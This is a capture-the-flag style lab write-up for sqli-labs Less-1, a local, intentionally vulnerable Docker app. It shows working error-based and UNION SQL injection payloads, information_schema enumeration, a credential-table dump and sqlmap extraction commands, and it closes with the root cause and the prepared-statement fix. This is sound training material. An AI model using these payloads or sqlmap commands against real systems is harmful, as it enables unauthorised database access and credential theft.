@@ -1,0 +1,132 @@
+# sqli-labs — Less-1: Error-Based SQL Injection (GET)
+
+**Target:** sqli-labs (via acgpiano/sqli-labs Docker image)
+**Environment:** Docker Desktop (container sqli-labs, port 8080:80), Firefox, Burp Suite (proxy), sqlmap (WSL/Ubuntu)
+**Endpoint:** http://localhost:8080/Less-1/?id=1
+
+## 1. Recon
+
+Loading the lab with a numeric id returns a normal response:
+
+Your Login name: Dumb
+Your Password: Dumb
+
+This suggests a backend query along the lines of:
+
+SELECT * FROM users WHERE id='$id' LIMIT 0,1
+
+## 2. Confirming the injection
+
+Appending a single quote breaks the query:
+
+http://localhost:8080/Less-1/?id=1'
+
+Response:
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL
+server version for the right syntax to use near '''1'' LIMIT 0,1' at line 1
+
+This confirms the id parameter is injected directly into a quoted string with no sanitization, and that the app reflects raw MySQL errors to the page — classic error-based SQL injection.
+
+## 3. Determining the column count
+
+Using ORDER BY to find how many columns the original query selects:
+
+id=1' order by 1-- -   -> normal
+id=1' order by 2-- -   -> normal
+id=1' order by 3-- -   -> normal
+id=1' order by 4-- -   -> error (Unknown column '4' in order clause)
+
+Column count: 3.
+
+Note: spaces in the payload must be URL-encoded (%20 or +) and the = separating the parameter name from its value must stay literal — encoding it (%3d) breaks parameter parsing entirely.
+
+## 4. Confirming reflection with UNION SELECT
+
+id=-1' union select 1,2,3-- -
+
+Using id=-1 (an ID guaranteed not to exist) forces the real query to return zero rows, so only the injected UNION row is displayed. Columns 2 and 3 reflect onto the page (the "Login name" / "Password" fields), confirming exactly where injected data will show up.
+
+## 5. Extracting database info
+
+id=-1' union select 1,version(),database()-- -
+
+Result:
+
+Login name: 5.5.44-0ubuntu0.14.04.1
+Password:   security
+
+- version() -> MySQL server version
+- database() -> current database name (security)
+
+## 6. Enumerating tables
+
+id=-1' union select 1,group_concat(table_name),3
+from information_schema.tables
+where table_schema=database()-- -
+
+information_schema.tables is a built-in MySQL system table listing every table on the server; filtering by table_schema=database() restricts it to the current database. Confirmed table: users.
+
+## 7. Enumerating columns
+
+id=-1' union select 1,group_concat(column_name),3
+from information_schema.columns
+where table_name='users'-- -
+
+Confirmed columns: id, username, password.
+
+## 8. Dumping the data
+
+id=-1' union select 1,group_concat(username,':',password),3
+from users-- -
+
+group_concat() merges every row into a single comma-separated string, dumping the whole table in one response:
+
+Dumb:Dumb, Angelina:I-kill-you, Dummy:p@ssword, secure:crappy, stupid:stupidity,
+superman:genious, batman:mob!le, admin:admin, admin1:admin1, admin2:admin2,
+admin3:admin3, dhakkan:dumbo, admin4:admin4
+
+## 9. Automating with sqlmap
+
+Full detection and extraction, no manual technique selection required — sqlmap tests boolean-based, error-based, time-based, and UNION-based injection automatically and uses whichever works:
+
+# Confirm the injection
+sqlmap -u "http://localhost:8080/Less-1/?id=1" -p id --batch
+
+# List databases
+sqlmap -u "http://localhost:8080/Less-1/?id=1" -p id --batch --dbs
+
+# List tables in `security`
+sqlmap -u "http://localhost:8080/Less-1/?id=1" -p id --batch -D security --tables
+
+# List columns in `users`
+sqlmap -u "http://localhost:8080/Less-1/?id=1" -p id --batch -D security -T users --columns
+
+# Dump the table
+sqlmap -u "http://localhost:8080/Less-1/?id=1" -p id --batch -D security -T users --dump
+
+sqlmap independently confirmed:
+- Boolean-based blind, error-based, time-based blind, and UNION query (3 columns) all injectable on id
+- Backend: MySQL >= 5.1, Apache 2.4.7, PHP 5.5.9, Ubuntu
+
+## Root cause
+
+User input (id) is concatenated directly into a SQL string without parameterization or escaping, and raw database errors are returned to the client. The fix is parameterized queries / prepared statements (e.g. mysqli_prepare with bound parameters) and disabling verbose error output in production.
+
+## Reference: keywords & flags used
+
+Category        | Item                                     | Purpose
+----------------|-------------------------------------------|----------------------------------------------
+SQLi syntax     | '                                         | Breaks out of the quoted string
+SQLi syntax     | -- -                                       | Comments out the rest of the original query
+SQLi syntax     | order by N                                 | Determines column count
+SQLi syntax     | union select                                | Injects attacker-controlled data into the output
+SQLi syntax     | version(), database()                      | Fingerprint the DB server/name
+SQLi syntax     | group_concat()                              | Merges multiple rows into one string
+SQLi syntax     | information_schema.tables/columns           | Enumerate schema metadata
+URL encoding    | %20 / +                                     | Encode spaces in the query string
+Burp Suite      | Proxy / Intercept / Repeater / HTTP History  | Capture, pause, and replay requests
+sqlmap          | -u, -p, --batch, --dbs, -D, --tables, -T, --columns, --dump | Automated detection and extraction
+
+---
+For educational purposes only, performed against a local, intentionally vulnerable Docker lab.
